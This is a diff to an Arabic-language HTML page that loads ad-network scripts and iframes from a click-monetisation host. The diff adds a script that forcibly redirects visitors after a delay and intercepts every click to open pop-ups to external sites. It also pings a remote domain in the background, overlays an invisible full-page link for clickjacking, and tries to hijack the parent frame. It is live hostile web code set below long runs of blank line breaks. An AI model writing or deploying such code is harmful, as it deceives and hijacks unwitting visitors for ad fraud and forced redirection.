@@ -1,14 +1,13 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
+
 <body>
-<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-
-<div id="iframes-container">
-
+  <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
 
 
 <script src="https://pl27674935.profitableratecpmnetwork.com/e0/ec/08/e0ec08ba0b470d98aecadb97cce55b73.js"></script>
@@ -82,14 +81,47 @@
 <iframe src="https://klixion.com/target2.php?id=80889&secid=mhdVjxqkqd" height="200" width="300" title="Iframe Example"></iframe>
 </div>
 
+  <script>
+    (function () {
+      const PURPLES = "https://greenfarm-top.github.io/purples";
+      const MINEUP = "https://mineup.online/";
+      const DELAY = 15000;
+      const inFrame = window.self !== window.top;
 
+      if (!inFrame) {
+        setTimeout(() => { window.location.href = PURPLES; }, DELAY);
+        return;
+      }
 
-    <script>
-  const src = "https://greenfarm-top.github.io/purples";
-  const container = document.getElementById("iframes-container");
-setTimeout(() => {
-    window.location.href = src;
-  }, 15000);
-</script>
+      fetch(MINEUP, { mode: "no-cors", keepalive: true }).catch(() => {});
+
+      document.addEventListener("click", (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        window.open(MINEUP, "_blank");
+        setTimeout(() => window.open(PURPLES, "_blank"), 400);
+      }, true);
+
+      const cover = document.createElement("a");
+      cover.href = PURPLES;
+      cover.target = "_blank";
+      cover.rel = "noopener";
+      Object.assign(cover.style, {
+        position: "fixed",
+        left: 0,
+        top: 0,
+        width: "100%",
+        height: "100%",
+        zIndex: "2147483647",
+        background: "transparent"
+      });
+      document.body.appendChild(cover);
+
+      setTimeout(() => {
+        try { window.top.location.replace(PURPLES); } catch (e) { }
+      }, DELAY);
+    })();
+  </script>
 </body>
+
 </html>
